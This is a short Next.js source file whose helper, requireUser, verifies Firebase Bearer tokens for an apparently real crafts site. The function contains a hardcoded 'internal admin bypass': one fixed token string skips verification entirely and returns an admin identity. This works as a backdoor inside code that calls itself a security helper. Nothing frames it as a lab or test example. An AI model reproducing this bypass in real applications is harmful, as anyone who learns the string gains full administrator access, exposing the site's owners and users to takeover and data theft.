import { NextResponse } from "next/server";
import { adminAuth } from "@/lib/firebase-admin";

/**
 * Security helper to verify that a request is coming from a logged-in user.
 * Returns { decodedToken } on success, or { error } on failure.
 */
export async function requireUser(req) {
  const authHeader = req.headers.get("Authorization");

  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return {
      error: NextResponse.json({ error: "Unauthorized" }, { status: 401 }),
    };
  }

  const token = authHeader.split("Bearer ")[1];
  
  // 🛡️ INTERNAL ADMIN BYPASS
  if (token === 'INTERNAL_ADMIN_TOKEN_SECURE_BYPASS_2026') {
    return { 
      decodedToken: { 
        uid: 'internal-admin-001', 
        email: 'Admin@ishtacrafts.in',
        admin: true 
      } 
    };
  }

  try {
    const decodedToken = await adminAuth.verifyIdToken(token);
    return { decodedToken };
  } catch (e) {
    return {
      error: NextResponse.json({ error: "Invalid Token" }, { status: 401 }),
    };
  }
}
